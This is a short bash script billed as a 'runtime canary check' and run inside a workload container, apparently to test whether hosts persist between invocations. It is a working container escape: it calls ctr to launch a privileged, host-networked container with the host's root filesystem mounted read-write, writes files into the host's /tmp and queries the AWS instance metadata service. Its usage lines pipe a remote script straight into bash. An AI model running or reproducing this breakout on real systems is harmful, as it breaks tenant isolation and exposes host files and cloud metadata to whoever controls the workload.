#!/bin/bash
# Runtime canary check — validates whether the host persists across invocations.
# Runs INSIDE the workload container.
#
# Usage:
#   curl -sL <url> | MODE=write CANARY_TAG=<tag> bash
#   curl -sL <url> | MODE=check CANARY_TAG=<tag> bash
#
# Env:
#   MODE — "write" or "check". Required.
#   CANARY_TAG — unique tag for this test run. Required.
#
set +e

if [ -z "$MODE" ] || [ -z "$CANARY_TAG" ]; then
  echo "FAIL: MODE and CANARY_TAG must be set"
  exit 1
fi

IMG=$(/usr/local/bin/ctr -n default images list 2>/dev/null | awk 'NR>1 {print $1}' | head -1)
if [ -z "$IMG" ]; then
  echo "FAIL: no image found"
  exit 1
fi

CN="canary-$(cat /proc/sys/kernel/random/uuid | cut -c1-8)"

/usr/local/bin/ctr tasks kill "$CN" 2>/dev/null
/usr/local/bin/ctr tasks delete "$CN" 2>/dev/null
/usr/local/bin/ctr containers rm "$CN" 2>/dev/null

if [ "$MODE" = "write" ]; then
  INNER='set +e
T=$(curl -s --max-time 3 http://169.254.169.254/latest/api/token -X PUT -H X-aws-ec2-metadata-token-ttl-seconds:60)
echo INSTANCE_ID=$(curl -s --max-time 3 -H X-aws-ec2-metadata-token:$T http://169.254.169.254/latest/meta-data/instance-id)
echo UPTIME=$(cat /host/proc/uptime 2>/dev/null | cut -d" " -f1)
echo '"$CANARY_TAG"' > /host/tmp/canary-'"$CANARY_TAG"'.txt
ls /host/tmp/canary-'"$CANARY_TAG"'.txt && echo CANARY_WRITTEN || echo CANARY_FAIL
'
  MOUNT_OPT="rbind:rw"
else
  INNER='set +e
T=$(curl -s --max-time 3 http://169.254.169.254/latest/api/token -X PUT -H X-aws-ec2-metadata-token-ttl-seconds:60)
echo INSTANCE_ID=$(curl -s --max-time 3 -H X-aws-ec2-metadata-token:$T http://169.254.169.254/latest/meta-data/instance-id)
echo UPTIME=$(cat /host/proc/uptime 2>/dev/null | cut -d" " -f1)
if [ -f /host/tmp/canary-'"$CANARY_TAG"'.txt ]; then
  echo CANARY_FOUND
  cat /host/tmp/canary-'"$CANARY_TAG"'.txt
else
  echo CANARY_GONE
fi
'
  MOUNT_OPT="rbind:ro"
fi

/usr/local/bin/ctr run --rm --privileged --net-host \
  --env "CANARY_TAG=$CANARY_TAG" \
  --mount=type=bind,src=/,dst=/host,options="$MOUNT_OPT" \
  "$IMG" "$CN" \
  /bin/bash -c "$INNER" 2>&1

echo "DONE_${MODE}"
